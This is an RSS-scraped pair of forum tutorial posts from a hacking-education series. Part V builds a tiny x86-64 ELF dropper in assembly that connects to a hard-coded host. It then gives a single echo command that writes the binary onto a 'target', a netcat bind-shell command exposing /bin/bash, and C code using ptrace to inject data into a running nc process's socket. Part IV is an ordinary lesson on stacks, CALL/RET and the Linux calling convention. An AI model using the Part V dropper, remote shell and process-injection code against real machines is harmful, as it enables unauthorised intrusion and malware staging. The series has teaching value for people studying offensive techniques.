<p>If you have been following this series you should be familiar with the concept of stack frame. You may remember that we mentioned how useful it is, but that it is not always needed…Well, this is one of those cases.</p>
<p>So, in this iteration we remove the stack frame of our program. Other than that, we just applied some minor tweaks here and there. This is how the final version looks like</p>
<pre><code class="lang-auto">BITS 64
;;; ELF header.... we make use of the 8 bytes available in the header
	org 0x400000
BUF_SIZE:	equ 1024
  ehdr:                                                 ; Elf64_Ehdr
                db      0x7F, "ELF", 2, 1, 1, 0         ;   e_ident
_start:
  	            xor edi,edi		; 31 ff  - Sets EDI to 0
	            inc edi         ; ff c7  - Sets EDI to 1
	            push rdi		; 57
	            pop  rsi		; 5e     - Sets RSO to 1
	            jmp _start1		; eb XX 


                dw      2                               ;   e_type
                dw      0x3e                            ;   e_machine
                dd      1                               ;   e_version
                dq      _start                          ;   e_entry
                dq      phdr - $$                       ;   e_phoff
                dq      0                               ;   e_shoff
                dd      0                               ;   e_flags
                dw      ehdrsize                        ;   e_ehsize
                dw      phdrsize                        ;   e_phentsize
                dw      1                               ;   e_phnum
                dw      0                               ;   e_shentsize
                dw      0                               ;   e_shnum
                dw      0                               ;   e_shstrndx
  
  ehdrsize      equ     $ - ehdr
  
  phdr:                                                 ; Elf32_Phdr
                dd      1                               ;   p_type
                dd      5                               ;   p_offset
	        dq      0
                dq      $$                              ;   p_vaddr
                dq      $$                              ;   p_paddr
                dq      filesize                        ;   p_filesz
                dq      filesize                        ;   p_memsz
                dq      0x1000                          ;   p_align
  
  phdrsize      equ     $ - phdr

	;;  Compile
	;; nasm -f bin -o fwget fwget.asm; chmod +x fwget

_start1:
	inc edi                 ; Set EDI to 2
	mov edx, 6              ; IPPROTO_TCP
	
	;; socket (AF_INET=2, SOCK_STREAM = 1, IPPROTO_TCP=6)
	call _socket
	mov ebx, eax		; Store socket on ebx
	;;  It is unlikely that the socket syscall will fail. No check for errors

	;; connect (s [rbp+0], addr, 16)
	mov edi, eax		; Saves 1 byte
	lea rsi, [rel addr]
	add edx,10
	
	call _connect
	;;	Just skip error check... if it fails is not gonna work anyway
	
	lea rsi, [rsp]	 ; Just use the stack as buffer.... we should decrement it
l0:				; Read loop
	;; Read data from socket
	;; _read (s = rbx, buf= [rsp], 1024);

	mov edi, ebx
	mov edx, BUF_SIZE
	call _read
	cmp eax, 0
	jle done

	;; Write to stdout
	;; _write (1, [rsp], rax)
	xor edi,edi
	inc edi			; rdi = 1
	mov edx, eax		; get len from _read
	call _write
	cmp eax, BUF_SIZE
	jl done
	jmp l0
done:
	;;  _close (s)
	;;	File descriptors get closed automatically when the process dies

	;; We do not care about exit code
	call _exit		
	
	;; Syscalls
_read:
	xor eax,eax
	jmp _do_syscall
	
_write:
	xor eax,eax
	inc eax

	jmp _do_syscall
	
_socket:
	;; mov rax, 41
	xor eax,eax
	add al, 41
	jmp _do_syscall
	
_connect:
	;; 	mov rax, 42
	xor eax,eax
	add al, 42
	jmp _do_syscall
	
_close:
	;; mov rax, 3
	xor eax,eax
	add al, 3
	jmp _do_syscall
	
_exit:
	xor eax,eax
	add al, 60

_do_syscall:
	syscall
	ret
	
addr dq 0x0100007f11110002
filesize equ $ - $$

</code></pre>
<p>This version is 240 bytes long and it is suitable to be dropped using a single <code>echo</code>.</p>
<pre><code class="lang-auto">echo -n -e "\\x7f\\x45\\x4c\\x46\\x02\\x01\\x01\\x00\\x31\\xff\\xff\\xc7\\x57\\x5e\\xeb\\x68\\x02\\x00\\x3e\\x00\\x01\\x00\\x00\\x00\\x08\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x38\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\xf0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xc7\\xba\\x06\\x00\\x00\\x00\\xe8\\x4b\\x00\\x00\\x00\\x89\\xc3\\x89\\xc7\\x48\\x8d\\x35\\x59\\x00\\x00\\x00\\x83\\xc2\\x0a\\xe8\\x3e\\x00\\x00\\x00\\x48\\x8d\\x34\\x24\\x89\\xdf\\xba\\x00\\x04\\x00\\x00\\xe8\\x1e\\x00\\x00\\x00\\x83\\xf8\\x00\\x7e\\x14\\x31\\xff\\xff\\xc7\\x89\\xc2\\xe8\\x12\\x00\\x00\\x00\\x3d\\x00\\x04\\x00\\x00\\x7c\\x02\\xeb\\xdb\\xe8\\x1c\\x00\\x00\\x00\\x31\\xc0\\xeb\\x1c\\x31\\xc0\\xff\\xc0\\xeb\\x16\\x31\\xc0\\x04\\x29\\xeb\\x10\\x31\\xc0\\x04\\x2a\\xeb\\x0a\\x31\\xc0\\x04\\x03\\xeb\\x04\\x31\\xc0\\x04\\x3c\\x0f\\x05\\xc3\\x02\\x00\\x11\\x11\\x7f\\x00\\x00\\x01" &gt; fwget; chmod +x fwget

</code></pre>
<p>In other words, it is small enough to be typed manually :). In case some compressor is available on the target machine a few more bytes could be saved, but not much more.</p>
<h1>Final word about the dropper</h1>
<p>As you may have noticed, this dropper connects to a hard-coded machine. Be free to add some extra code to process command-line arguments and made this value a parameter (the command-line parameters are passed to <code>_start</code> in the stack), but that will just increase the size of our dropper.</p>
<p>You can easily recompile your dropper with a new IP/Port or just write a small program/script to patch the binary. This I’ll leave as an exercise for the reader.</p>
<h1>Dropping a Dropper like a pro</h1>
<p>At this point, we are done with this lesson, but as this was a little bit light, let’s add a bit of coolness. Yes, sure, we can drop our dropper just pasting the previous <code>echo</code> command in our interactive console, or redirecting the file using whatever tool we already use to get into our interactive session. But, let’s face it. That is a pretty boring way of doing it.</p>
<p>So, what we are going to do is to attach to the interactive shell program (in this example we will be using <code>nc</code>), and drop our commands directly on the open socket to the remote machine. In order to figure out which socket you need to write to, we can check <code>/proc/PID/fd</code>. Let’s setup our environment.</p>
<p>Suppose we have got access to machine <code>target</code> and started a remove shell using <code>nc.openbsd</code> (the other one does not have the flag <code>-e</code>). Something like this:</p>
<pre><code>hacker@target $ nc -e /bin/bash -l -p 1234
</code></pre>
<p>Now, from the hackers machine we can start a remote shell session like this:</p>
<pre><code>hacker@hackerbox $ nc target 1234
</code></pre>
<p>At this point, we have a TCP connection to machine <code>target</code> going on. If we now get the pid can check the open file descriptors for this process:</p>
<pre><code>hacker@hackerbox $ ps ax | grep "nc target" | head -1
 8095 pts/37   S+     0:00 nc target 1234
hacker@hackerbox $ ls -l /proc/8095/fd
total 0
lrwx------ 1 pico pico 64 Sep 12 11:25 0 -&gt; /dev/pts/37
lrwx------ 1 pico pico 64 Sep 12 11:25 1 -&gt; /dev/pts/37
lrwx------ 1 pico pico 64 Sep 12 11:25 2 -&gt; /dev/pts/37
lr-x------ 1 pico pico 64 Sep 12 11:25 3 -&gt; 'pipe:[45281146]'
l-wx------ 1 pico pico 64 Sep 12 11:25 4 -&gt; 'pipe:[45281146]'
lrwx------ 1 pico pico 64 Sep 12 11:25 5 -&gt; 'socket:[60870195]'
</code></pre>
<p>Here we can see the three first file descriptors associated to the pseudoterminal, namely: <code>stdin</code>, <code>stdout</code> and <code>stderr</code>. Then a <code>pipe</code> what I’m not sure why it is created for, but it would be a nice exercise to check it out.</p>
<p>Finally, we can see that file descriptor 5 is our socket… So now we know where to write our stuff.</p>
<h1>Attaching to the process. Meeting <code>ptrace</code>
</h1>
<p>It is time to start writing our cool tool. It will attach to any process as a debugger and write some data to a given file descriptor within that process. The way to achieve this is using the system call <code>ptrace</code>.</p>
<p>Again, the program may look complex at first glance, but it is just a basic sequence of system calls being executed sequentially… Actually it is just one single system call (<code>ptrace</code>) being executed with different parameters.</p>
<p>I will not put all the code here. You can find it on my <a href="https://github.com/0x00pf/0x00sec_code" rel="noopener nofollow ugc">github repository</a>. Here I will just include the relevant parts of the program.</p>
<p>So, the first thing we have to do, as indicated before is to get attached to the indicated process:</p>
<pre><code class="lang-auto">  _pid = atoi (argv[1]);

  printf ("+ Attaching to process %ld\n", _pid);
  if ((ptrace (PTRACE_ATTACH, _pid, NULL, NULL)) &lt; 0)
    perror ("ptrace_attach:");
  
  printf ("%s", " ..... Waiting for process...\n");
  wait (&amp;status);
</code></pre>
<p>The <code>atoi</code> function at the beginning allows us to convert a string (<code>Ascii</code>) to an number (<code>Integer</code>)(<code>AsciiTOInteger</code> -&gt; <code>atoi</code>). Yes, we are passing the <code>pid</code> to attach to as a parameter to our program. Then we just find the <code>ptrace</code> system call being invoked with the <em>request</em> <code>PTRACE_ATTACH</code> that allows us to get attached to the process indicated by the second parameter. Parameters 3 and 4 are not used for this request.</p>
<p>After issuing this request, we need to wait for the process to stop and give us back the control. This we do using the system call <code>wait</code>.</p>
<p>At this point we have full access to the process and we can do whatever we want with it.</p>
<p><em>Note: You need to have enough permissions to be able to attach to a running process</em></p>
<h1>Preparing code injection</h1>
<p>Now we have to do some tasks to be able to execute some code from within the process being controlled. The first thing we do is to retrieve the current registers values. We will be using these values to run our code but also, we want to restore everything to the previous state when we are done, so our remote shell session continues working normally.</p>
<pre><code class="lang-auto">  if ((ptrace (PTRACE_GETREGS, _pid, 0, &amp;regs)) &lt; 0) 
      perror ("ptrace_get_regs:");
  memcpy (&amp;regs_cpy, &amp;regs, sizeof (struct user_regs_struct));
</code></pre>
<p>Pretty straight forward isn’t it?. After getting the registers we made a copy that we will be using during the clean-up to get everything as it was before we break into the process.</p>
<p>The other thing we have to do is to save the current instruction being executed. Ok, this looks like a good time to further explain what we are going to do.</p>
<p>In order to write into a file descriptor, we have to issue the <code>write</code> system call. As we know, to run a system call we just need to set our registers and then run the <code>syscall</code> instruction. We can deal with the registers separately using the <code>PTRACE_GETREGS</code> (yes, sure, there is a <code>PTRACE_SETREGS</code> also, so we are done there), but we need to run the <code>syscall</code> instruction. For doing that we have 2 options:</p>
<ul>
<li>We scan the memory looking for the instruction and set <code>RIP</code> to point there so when we re-start the process that instruction get executed…</li>
<li>Or we just insert the <code>syscall</code> instruction at whatever place. In that case, we need to store the previous value at that position, in order to restore it once our system call has been executed.</li>
</ul>
<p>We chose the second option, so we need to get the current opcode and overwrite it:</p>
<pre><code class="lang-auto"> if ((opcode = ptrace (PTRACE_PEEKTEXT, _pid, regs.rip, 0)) &lt; 0)
    perror ("retrieve opcode:");
(...)
  ptrace (PTRACE_POKETEXT, _pid, regs.rip, 0x050f050f050f050f);
	
</code></pre>
<p>Also pretty straightforward. We use <code>PTRACE_PEEKTEXT</code> to read the current opcode (the one <code>RIP</code> is pointing to, and then we inject our <code>syscall</code> instruction (<code>0x05 0x0f</code>). To be honest I didn’t bother to figure out, if the opcodes should be in the lower part of the long or in the high… I just filled the whole 8 bytes with the opcode to be sure. Anyways, <code>ptrace</code> will write the 8 bytes…</p>
<h1>Allocating a buffer and filling it</h1>
<p>We are almost ready to run our <code>write</code> system call. We just need a buffer to hold the data we want to send through the socket.</p>
<p>Again, we can do this in many different ways:</p>
<ul>
<li>We can overwrite part of the <code>text</code> segment with our data and then restore it as we have done with the opcode in the previous section.</li>
<li>Doing something similar on the <code>data</code> segment</li>
<li>Actually allocate memory using <code>brk</code> and then release it</li>
<li>Or just use the stack</li>
</ul>
<p>So, we went for the last option as it was the simplest. We just make some room in the <code>stack</code> to be sure we do not overwrite any previous data in there when we write our data. We do not need to do anything else, at the end of the process, when we restore the original register values, the stack pointer will go back to the right position and all the memory we used will immediately be recover.</p>
<p>We wrote a simple function to poke arbitrary strings in the stack. The function looks like this:</p>
<pre><code class="lang-auto">int cpy_str (pid_t _pid, char *str, unsigned long long int *p) {
  int                     i;
  int                     len = strlen (str);
  int                     len1 = (len / 8) + 1;
  char                   *aux = malloc (len1 * 8);
  unsigned long long int *d = (unsigned long long int*)aux;

  printf ("!! Reallocating %d to %d bytes\n", len, len1);
  memset (aux, 0, len1);
  strcpy (d, str);
  
  for (i = 0; i &lt; len1 + 1; i++)    {
      if ((ptrace (PTRACE_POKEDATA, _pid, p, *d)) &lt; 0) perror ("POKE Stack:");
      p++; d++;
    }
	
  free (aux);
  return len;
}
</code></pre>
<p>The function just copies a given string into a given address. But as we have to do this in blocks of 8 bytes, I have just reallocated a new buffer adjusted to 8 bytes boundary and used it, instead of having extra checks in the loop.</p>
<p>The <code>for</code> loop in the code above is like a compressed form of <code>while</code> loop.</p>
<pre><code class="lang-auto">for (i = 0; i &lt; len1; i++) { (...) }
</code></pre>
<p>is equivalent to</p>
<pre><code class="lang-auto">i = 0;
while (i &lt; len1) {
  (...)
  i++;
}
</code></pre>
<p>Function <code>memset</code> and <code>strcpy</code> allow us to initialise a given memory region with a value or copy a memory buffer into another. <code>strcpy</code> work on C strings that are delimited by a tailing <code>\0</code>. In this case that is fine for us, otherwise we should determine the size ourselves and use <code>memcpy</code> instead.</p>
<h1>Sending the data</h1>
<p>Now, everything is setup to send our data through the socket we had already identified. We had overwrite the current instruction to become a <code>syscall</code>. We have our buffer in the stack. So, now we just need to set our registers up and let the process continue execution.</p>
<pre><code class="lang-auto">     regs.rax = 1;        // Write syscall
     regs.rdi = 5;        // socket (the one we identified at /proc/PID/fd
     regs.rsi = regs.rsp; // Buf in the stack
     regs.rdx= slen;      // Len of buffer to write
      
     if ((ptrace (PTRACE_SETREGS, _pid, 0, &amp;regs)) &lt; 0)
	    perror ("ptrace_set_regs:");
	
     if ((ptrace (PTRACE_SINGLESTEP, _pid, 0,0)) &lt; 0) perror ("Run syscallL");
     wait (&amp;status);
	  
     if ((ptrace (PTRACE_SINGLESTEP, _pid, 0,0)) &lt; 0) perror ("Run syscallL");
     wait (&amp;status);
</code></pre>
<p>So, we set our registers. See it as a bunch of <code>mov</code>s, but we can just set all of them at once using <code>PTRACE_SETREGS</code>. Then we use the <code>PTRACE_SINGLESTEP</code> to run our instruction and <code>wait</code> to get control back from the process.</p>
<p>Here I have to say that I haven’t figured our yet why I need to call <code>PTRACE_SINGLESTEP</code> twice. If anybody know, let us all know in the comments.</p>
<h1>Cleaning up</h1>
<p>Now the buffer has been sent to the remote machine. We just need to send the <code>echo</code> command shown above to <em>Drop the Dropper</em> in the remote machine.</p>
<p>Finally, we just want to clean up, so our shell session keeps going normally. If we just stop here, <code>nc</code> will likely crash. The clean up code is also straightforward:</p>
<pre><code class="lang-auto">  if ((ptrace (PTRACE_POKETEXT, _pid, regs_cpy.rip, opcode)) &lt; 0) 
       perror ("Restore opcode:");

  if ((ptrace (PTRACE_SETREGS, _pid, 0, &amp;regs_cpy)) &lt; 0) 
       perror ("ptrace_set_regs:");
  
  if ((ptrace (PTRACE_DETACH, _pid, NULL, NULL)) &lt; 0) 
       perror ("ptrace_deattach:");
  wait (&amp;status);
</code></pre>
<p>The first thing we do is to restore the original opcode we override with our own <code>syscall</code> opcodes. Note that we are now using the copy of the registers we made at the beginning, so everything will go to the right place despite of how much we could have messed around while tracing the process.</p>
<p>Then we restore the registers and everything should be fine to get back to the point it was before we attached to the process. Now we just need to <code>detach</code> from the process and it will just keep running normally.</p>
<h1>Conclusions</h1>
<p>In this part we have worked on the concept we already know and applied it to the case of building a dropper. We have lightly touched the field of network programming and we ended up introducing the basics about writing debuggers.</p>
<p>Most of what we have seen in this part is pretty similar to stuff you may find in the real world. Take a look to <a href="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966">this post</a> specially to the paper linked at the end about Hajime.</p>
<p>Did you made the dropper smaller?. Have you used other ideas to shrinking it?. Let us know. Any comment, question and feedback is welcomed! <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>You can get all the code from my repo here:</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
      <a href="https://github.com/0x00pf/0x00sec_code/tree/master/min_dropper" target="_blank" rel="noopener nofollow ugc">GitHub</a>
  </header>
  <article class="onebox-body">
    <img src="//0x00sec.s3.dualstack.us-east-1.amazonaws.com/original/2X/a/a35c2bf9477f702a5322cfd1c8f54353d79c1d16.png" class="thumbnail" width="" height="">

<h3><a href="https://github.com/0x00pf/0x00sec_code/tree/master/min_dropper" target="_blank" rel="noopener nofollow ugc">0x00pf/0x00sec_code</a></h3>

<p>Code for my 0x00sec.org posts. Contribute to 0x00pf/0x00sec_code development by creating an account on GitHub.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

            <p><small>5 posts - 3 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/programming-for-wannabes-part-v-a-dropper/23090">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/programming-for-wannabes-part-v-a-dropper/23090</link>
          <pubDate>Sat, 12 Sep 2020 11:49:14 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-23090</guid>
          <source url="https://d.clarkee.co.uk/t/programming-for-wannabes-part-v-a-dropper/23090.rss">Programming for Wannabes. Part V. A Dropper</source>
        </item>
        <item>
          <title>Programming for Wannabes. Part IV</title>
          <dc:creator><![CDATA[0x00pf]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>Some people have asked me to continue this series… and actually this paper was half written almost two years ago… so I decided to <em>finish him</em>… you know, the <em>Mortal Kombat</em> way… Not sure if I will write Part V… but Part IV is here <img src="https://d.clarkee.co.uk/images/emoji/twitter/slight_smile.png?v=15" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"></p>
<hr>
<p>Let’s continue our journey towards the ultimate mastering of the computer which will lead us to full enlightenment. So far, we have learnt a few things about computers and, in the meantime, we have already create our first shellcode. However, we have just scratched the surface of this whole field… you still have things to learn.</p>
<p>In this part we are going to dive into how programs are built and get in contact with the insights of some exploitation techniques.</p>
<h1><a name="p-59270-stacks-1" class="anchor" href="https://d.clarkee.co.uk#p-59270-stacks-1"></a>Stacks</h1>
<p>In order to go further in our study we have to introduce a new computer element. <strong>The Stack</strong>. The Stack is just a very simple data structure. It is, maybe, the one and only data structure that is available when programming in assembly. Do to panic, you will see in a second that it is damn simple.</p>
<p>I’m pretty sure you already know this, but just in case, let’s add a simple explanation here. You can think about a <strong>stack</strong> as a physical <strong>stack</strong>. Think for instance about the stack you build when you wash your dishes. You wash one dish and you put it aside. Then you wash another one, and you put it on top of the previous,… and so on. At the end you have a stack of dishes.</p>
<p>Now, let’s imagine that is lunch time and you have to take a few dishes to serve your food. What do you do?. Yes, you take first the dish on the top of the stack. The last one you put in the stack. You can try to get the one in the bottom, but that is pretty difficult.</p>
<p>So, a <strong>stack</strong> is a so-called LIFO structure. LIFO stands for <em>Last In, First out</em>. The last dish you put in the stack is the first one you are gonna take whenever you are hungry. There is other major structure called FIFO. I bet you can figure out by know how does it work.</p>
<h1><a name="p-59270-the-stack-2" class="anchor" href="https://d.clarkee.co.uk#p-59270-the-stack-2"></a>The STACK</h1>
<p>At processor level, a stack is basically a pointer to a memory block. Usually, the processor provides a dedicated register to hold that pointer and, guess what?, it is usually named <em>Stack Pointer</em>. This will be engraved in your soul by the end of this instalment. This is one of those special register we had mentioned in previous parts of this course. Now, we know the most important two (among those special registers): The <em>Instruction Pointer</em> and the <em>Stack Pointer</em>. They are special because some processor instructions only work on the values of those registers.</p>
<p>For the specific case of the <em>Stack Pointer</em>, there are two basic operations you can perform with a stack:</p>
<ul>
<li><code>PUSH</code>. This operation pushes/stores a value in the stack.</li>
<li><code>POP</code>. This operation pops/retrieves a value from the stack</li>
</ul>
<p>In general, this is all you need to know at assembly level. However, let’s go a bit deeper in the implementation, just for the sake of our personal enlightenment :). After all this is what we are trying to achieve… Do you know why hackers uses a hood? don’t you?..It is because they had reached an enlightenment level that transcend their physical body and their head actually emits light… that’s why  they cover their head with a hood… it is not about looking cool… is about not looking weird.</p>
<p>Anyways, the first thing we have to know about a <em>stack</em> implementation is that it grows. This is not strictly correct, but it is the best way to see it now. What this means is that we can implement the stack in two different ways:</p>
<ul>
<li>We can make the stack grow up, towards the high memory addresses</li>
<li>We can make the stack grow down, towards the low memory addresses</li>
</ul>
<p>Most processors nowadays makes the stack grow down, or allow us to chose the model we prefer. The only architecture I know it grows the stack up is PA-RISC. What does this means, well, this just means that, whenever you <code>push</code> a value in the stack, the <em>Stack Pointer</em> is decremented and, whenever you <code>pop</code> a value from the stack, the <em>Stack Pointer</em> gets incremented.</p>
<p>The second thing we have to know about a <em>stack</em> implementation is where the <em>Stack Pointer</em> points. There are two ways of doing this. You (actually the processor designer) can decide that the <em>Stack Pointer</em> points to the last used position in the stack, or you can decide that the <em>Stack Pointer</em> points to the last free position in the stack. For Intel processors the <em>Stack Pointer</em> always points to the last used stack position.</p>
<p>With all this information we can now figure out how to implement the <code>PUSH</code> and <code>POP</code> instructions</p>
<pre><code>             SP First Free               SP Last Used
===========================================================
Grow Down     PUSH V                      PUSH B
              --------------------------------------------
              MOV [SP], V                SUB SP, WS
              SUB SP, WS                 MOV [SP], V

              POP V                      POP V
              ----------------------------------------------
              ADD SP, WS                 MOV V, [SP]
              MOV V, [SP]                ADD SP, WS
============================================================
Grow Up       PUSH V                     PUSH B
              ----------------------------------------------
              MOV [SP], V                ADD SP, WS
              ADD SP, WS                 MOV [SP], V

              POP V                      POP V
              ----------------------------------------------
              SUB SP, WS                 MOV V, [SP]
              MOV V, [SP]                SUB SP, WS
</code></pre>
<p>In the table above, <code>V</code> represents the value we want to store in the stack, and <code>WS</code> is the default processor word size in bytes (check the <a href="https://0x00sec.org/t/programming-for-wannabees-part-iii-your-first-shell-code/1279/1" rel="noopener nofollow ugc">https://0x00sec.org/t/programming-for-wannabees-part-iii-your-first-shell-code/1279/1</a> for details). <code>SP</code> is the stack pointer (usually a special register, and the <code>[]</code> operator means that we want to access the contents of the address pointed by whatever we put inside the <code>[]</code>. This is called indirect addressing, but… we haven’t talked about addressing so far, so, just remember it allows to access the content of a memory position.</p>
<p>You may be wondering… why should I care about the table above?. I will just do <code>PUSH</code> and <code>POP</code> and the processor will take care of doing the right things with the stack pointer. That is true. However, sometimes you will need to manipulate the registers yourself or, while reversing code, you will find manipulations of the <em>Stack Pointer</em> like the ones shown above (compilers do this things)… so it is convenient to understand how does this works.</p>
<blockquote>
<p>Modern processors uses microcode to implement they machine code. This is, each opcode in the processor is a small program of lower level instructions that deals directly with the datapaths on the processor. <code>PUSH</code> and <code>POP</code> in real-life microcode won’t look like our example above, but could be pretty similar. VAX machines were one of the first one to use microcode to implement its instruction set.</p>
</blockquote>
<h1><a name="p-59270-what-is-the-stack-used-for-3" class="anchor" href="https://d.clarkee.co.uk#p-59270-what-is-the-stack-used-for-3"></a>What is the Stack used for?</h1>
<p>The generic response is: <em>to store temporal values</em>. This is a pretty generic answer. Some more specific examples are:</p>
<ul>
<li>Implement nested functions storing the return addresses in the stack</li>
<li>Store local variables (actually local scoped variables)</li>
<li>Store function parameters for certain ABIs</li>
<li>Enable recursion</li>
</ul>
<p>Actually, all the examples given above, can be condensed in a single concept. The so called <code>stack frame</code> of a function… But to go deeper in that we first need to know what a function is.</p>
<h1><a name="p-59270-functions-4" class="anchor" href="https://d.clarkee.co.uk#p-59270-functions-4"></a>Functions</h1>
<p>In the computers realm, functions mimics the mathematical concepts. In that sense, a function is something that receives some parameters and return some value/values. This is the case for most high level languages like C or Python. However, at assembly level, this concept does not really exist. The high level languages just make use of the processor instructions to provide that abstraction… After all this is what computer sciences are all about… to create the illusion of something happening that is not really happening. It is about fooling people :).</p>
<p>You can achieve this in many different ways, as we will see in a while. However, each programming language and also the operating system defines some default rules so all components in the system can talk to each other. We have already mentioned this a few times, it is the so-called <strong>ABI</strong> (Application Binary Interface). As we progress in this section this concept will make more sense… I hope.</p>
<p>For us, a function is a piece of code, stored somewhere in memory that we can execute at any time, passing some data in, and optionally, receiving some data back. Let’s see how we can do this.</p>
<h2><a name="p-59270-assembly-support-5" class="anchor" href="https://d.clarkee.co.uk#p-59270-assembly-support-5"></a>Assembly support</h2>
<p>So, how does the processor supports the implementation of functions. Well, the first thing we have to do is to be able to change the flow of our program. So far, all the programs we have seen work sequentially. We start at a given instruction, and the program reads those instruction one after the other.</p>
<p>In general, we will want to call our functions many times. Actually that is one of the fundamental reasons to define functions, to avoid copying the same code whenever it is needed, making our programs grow in size, and making it really difficult to maintain. So, what we need is a way to change the <code>Instruction Pointer</code>. We could use our well known <code>MOV</code> instruction to update the <code>RIP</code> register (the instruction pointer) and force the processor to continue the execution in a new memory address. However it does not work like that (well it does sometimes)… To be honest I have never tried that outside of a debugger, but, anyway, there are very good reasons to use the processor mnemonics to chance the Instruction Pointer, instead of doing it directly by ourselves.</p>
<p>It is not the right time to go into these details, but for the more advanced and curious reader you can search for concepts as processor pipelines, branch prediction units and processor cache to figure out why it is better to use the proper instructions when changing program flow.</p>
<p>So, the machine instructions traditionally used to <em>call a function</em> in assembler for the Intel platform are <code>CALL</code> and <code>RET</code>. Let’s see what <code>CALL</code> does.</p>
<p>First thing <code>CALL</code> does is to push into the stack the address of the next instruction. The so-called <em>Return Address</em> (remember this name). Then it changes the instruction pointer to the address passed as parameter.</p>
<p>After invoking a <code>CALL</code> instruction, our program will continue in the address passed as parameter and store in the stack the address we have to return to in order to continue the execution whenever we are done with our function. So basically a <code>CALL</code> instruction does something like:</p>
<pre><code class="lang-auto">CALL ADDR  -&gt; PUSH RIP + 1
              JMP  ADDR
</code></pre>
<p>The <code>RET</code> instructions does the opposite. it recovers a value from the stack and sets <code>RIP</code> to that value. Unless we had messed up with the stack in our function (let’s talk about smashing the stack in a while…), the address in the stack should be the instruction just after the <code>CALL</code>.</p>
<pre><code class="lang-auto">RET      -&gt; POP RIP
</code></pre>
<p>Let’s rewrite the function we used in the first part of this course with information we have now:</p>
<pre><code class="lang-auto">f1: mov eax, 0xa
    mov edx, 0x14
    add eax, edx
    ret

main:(... Program starts here....) 
     call f1
      (... program continues here ...)
</code></pre>
<p>So far so good. Now we know how the processor allows us to run a piece of code located somewhere in the memory and, when done, return back just to the point where we were before calling the function.</p>
<h2><a name="p-59270-abi-parameters-and-return-values-6" class="anchor" href="https://d.clarkee.co.uk#p-59270-abi-parameters-and-return-values-6"></a>ABI. Parameters and return values</h2>
<p>The function we have just written, does not receive any parameter and does not return anything. Well it actually returns a value under some platforms but we will see why in a second.</p>
<p>So, how can we pass parameters and receive returns values from an assembly function?. The answer is… it is up to us. At assembly level we can do whatever we want. However there are a few reasonable options to deal with this in a systematic and ordered way. Let’s check them out:</p>
<ul>
<li>We can push our parameters in the stack and receive the result in a register. This is the way used by <code>x86</code> (Intel 32 bits) applications…</li>
<li>We can store our parameters in the registers and receive the result also in registers. This is roughly how a <code>x86-64</code> application works. For 64bits processors we have a lot of registers so it is faster to just use the registers to pass the parameters than using the stack (after all the stack is memory and is slower than the registers). However, for functions that receives a lot of parameters, the stack is used when no more registers are available… Now you know why it is better to define functions with a reasonable number of parameters.</li>
<li>We can use some registers to pass parameters in and some registers to pass parameters out. This is what ARM and MIPS does… again, when there are enough registers available to hold the parameters and return values.</li>
</ul>
<blockquote>
<p>When our function can return more than one value we would use output parameters passed as reference so they can be modified by the function. In this case return values are manages exactly the same as parameters are, in a sense they are also parameters. You can figure out what would happen if you try to just store return values in the stack within the function… It won’t work straight away. But do that when you have finished reading this instalment.</p>
</blockquote>
<p>In principle, the <code>ABI</code> depends on the operating system, however, in practice, it is mostly driven by the processor. This way, Linux follows the so-called System V ABI, and Windows have its own, but both uses the stack for 32 bits and registers for 64bits, even when Windows defines more cases and different registers may be used for the parameters.</p>
<p>Now, let’s modify our test function so it will get the two numbers to be added as parameters. We will chose to pass parameters in registers and return the result also in registers. As we said above, this is the Linux 64bits ABI. Specifically for this case:</p>
<pre><code class="lang-auto">Param 1  | Param 2 | Param 3 | Param 4 | Return
   RDI   |    RSI  |    RDX  |    RCX  |   RAX
</code></pre>
<p>So, the code will now look like this:</p>
<pre data-code-wrap="asm"><code class="lang-asm">f1: mov rax, rdi	; Copy Param 1 in RAX
    add rax, rsi	; Add Param1+Param2 in RAX
    ret	

main:(... Program starts here....) 
     mov rdi, 0x0a	 ; Param 1
     mov rsi, 0x14	 ; Param 2
     call f1
			; RAX contains Param1 + Param2
      (... program continues here ...)

</code></pre>
<p>That was easy right?.</p>
<p>Actually, this function is compatible with the System V ABI followed by GNU/Linux… or in other words, we can call this function from a C program and it will work as expected:</p>
<p>This is the assembly function in file <code>ex.S</code>… let’s use AT&amp;T asm so we can just use the file directly with <code>gcc</code> for compiling.</p>
<pre data-code-wrap="Assembly"><code class="lang-Assembly">	.global f1
f1:	mov %rdi, %rax
	add %rsi,%rax
	ret
</code></pre>
<p>This is the C main program in file <code>ex.c</code>:</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;

int f1 (int a, int b); // Prototype

int main (void) {
  printf ("Result: %d\n", f1 (10, 20));
}
</code></pre>
<p>Yes… we are polite and we include the prototype for our asm function.</p>
<p>Now we can compile:</p>
<pre><code>$ gcc -o ex ex.c ex.S
$ ./ex
Result: 30
</code></pre>
